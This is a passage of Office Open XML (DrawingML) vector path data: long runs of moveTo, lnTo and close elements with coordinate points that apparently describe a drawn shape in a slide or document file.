                    <a:pt x="13133" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13977" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14674" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="1724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14674" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="440"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13757" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13610" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12913" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12363" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="1137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12033" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12143" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13683" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15004" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15371" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15591" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15994" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15994" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15664" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15517" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15371" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="0"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11115" y="4549"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11446" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="4549"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6860" y="3632"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7007" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7191" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="3632"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6530" y="3192"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6494" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6274" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7301" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="3192"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11739" y="5136"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12179" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11556" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12143" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12363" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12840" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12840" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13023" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11226" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9722" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9612" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10419" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="5136"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11996" y="8254"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12546" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12950" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13023" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12950" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12033" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="8254"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10932" y="8841"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11519" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12033" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11226" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="8841"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12509" y="9354"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12876" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12363" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="9354"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10382" y="9721"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11409" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12033" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="9721"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10455" y="10528"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10785" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11336" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11226" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="10528"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10125" y="11665"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10785" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
